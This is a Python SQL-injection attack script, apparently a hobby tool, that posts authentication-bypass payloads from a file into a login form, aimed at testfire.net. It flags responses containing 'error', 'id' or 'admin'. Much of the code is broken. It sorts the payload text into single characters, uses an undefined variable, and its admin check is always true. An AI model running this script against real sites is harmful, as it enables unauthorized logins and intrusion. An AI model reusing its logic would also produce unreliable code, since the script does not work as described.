#myenv\Scripts\activate
import os
import sys
import asyncio
import re
import requests
from colorama import Fore,init,Style
from datetime import datetime
# import sock
import sqlite3
# from database import create_database_for_Captures
import os
import sys

current_directory = os.getcwd()

sys.path.append(current_directory)

from lib.scripts.headers import *
from logger.logs import logger
from lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from lib.Stacks.stack import html_response,Significant_captures
from lib.result.Results import SQLJNG_result_report

import logging

attack_type = "authentication bypass SQL injection"

"""
Oracle SQL Injection Exploit Script

This script is designed for educational purposes and should only be used with explicit permission on systems you are authorized to test. It focuses on testing and exploiting potential Oracle SQL injection vulnerabilities in a specified target URL.

Reference:
- Payloads: https://github.com/payloadbox/sql-injection-payload-list
- Header inspiration: https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url

Tested against: [Specify target URL]

Dependencies:
- colorama
- requests
- headers (custom module, assumed to be in the 'scripts' directory)
- SQLite3 (for logging captures, if used)

Usage:
1. Ensure all dependencies are installed using 'pip install colorama requests'.
2. Set the 'urls' variable with the target URL.
3. Run the script and follow the prompts to send payloads to the target.

Note:
- Obtain explicit permission to test the security of the target system.
- Be aware of legal and ethical considerations when using this script.

Author: Alimirmohammad
"""





pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

###############################################


#
logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)


async def ORACLE_SQL_injection(urls):
    try:
        """This is the main block of our exploit program which sending the payloads. """
        global pattern,htmlpattern  
        done = False 
        filename = "Oracleinj.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read()
            rows = payload 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) #* 
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) 
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
                logger.info("payload is ready to send.")

                if ask.lower() == "y":
                    for line in sorted_payload: 
                        params = { 
                            "username": line,
                            "password": line
                        }
                        await Prepare_the_headers()
                        for headerR in headers:
                            ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
                            logger.info(f"Testing payload:{line}")
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info("Error parameter might exists in the code.")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.Insert_to_stack(indx=0,value=str(ack.text))
                                #capture will be recorded at index 0
                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logger.info("id parameter found.(might exists)")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.Insert_to_stack(indx=1,value=str(ack.text))
                                # value will be inserted a the index 1
                            
                            if htmlVULN:
                                logger.info("error parameter founded in the code.(might exists)")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.Insert_to_stack(indx=2,value=str(ack.text))
                            
                            word = "id" in req.text                             
                            errword = "error" in req.text
                            if word:
                                logger.info("Id parameter found in the code.(might exists)")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.Insert_to_stack(indx=3,value=str(ack.text))

                            
                            if errword:
                                logger.info("error parameter might exists")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.Insert_to_stack(indx=4,value=str(ack.text))

                            
                                
                        if req.status_code == 302:                                             
                            logger.info("Could inject the keyword:",line)
                            Significant_captures.Insert_to_stack(indx=0,value=str(ack.text))
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            logger.info("Admin parameter might exists")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.Insert_to_stack(indx=6,value=str(ack.text))
                            
            else:
                logger.error("Host is down")
        
    except StopIteration:
        pass
    
    except KeyboardInterrupt:
        logger.info("Aborted")
        raise SystemExit     


        
    finally:
        try:
            await SQLJNG_result_report(html_response)
        except Exception as e:
            logger.error(e)
     
        
        
     



asyncio.run(ORACLE_SQL_injection("http://testfire.net/login.jsp"))
